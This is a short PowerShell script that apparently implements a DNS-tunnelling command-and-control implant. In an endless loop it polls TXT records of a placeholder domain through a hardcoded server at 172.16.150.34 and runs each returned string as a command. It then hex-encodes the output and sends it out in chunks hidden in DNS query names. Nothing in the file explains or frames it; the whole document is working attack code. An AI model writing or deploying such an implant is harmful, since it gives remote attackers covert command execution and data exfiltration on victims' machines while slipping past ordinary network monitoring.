function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $r += '{0:X}' -f [int][char]$_
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

function split_to_chunks($astring, $size=20) {
    $new_arr = @()
    $chunk_index=0
    $newastring = $astring + "00000000000000000000000000000000"
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += StringToHex (@($newastring.substring($chunk_index,$size)))
        $chunk_index += $size
    }
    return $new_arr
}

function send_response($response) {
    $chunks = (split_to_chunks ($response.Replace("`n",";") -replace '\s+', ',') )
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $id = $(Resolve-DnsName -Server "172.16.150.34" -Name "$j.6f7574.replacethisdomain.com" -Type TXT).Strings
        }
        else {
            $(Resolve-DnsName -Server "172.16.150.34" -Name "$id.$j.6f7574.replacethisdomain.com" -Type TXT).Strings
        }
    }
    return $id
}


while ($true) {
    $A = $(Resolve-DnsName -Server "172.16.150.34" -Name "replacethisdomain.com" -Type TXT).Strings

    if ($A.length -ne 0) {
        $response = $(& $A) | Out-String
        send_response $response

        
    }

    sleep -Seconds 15
}

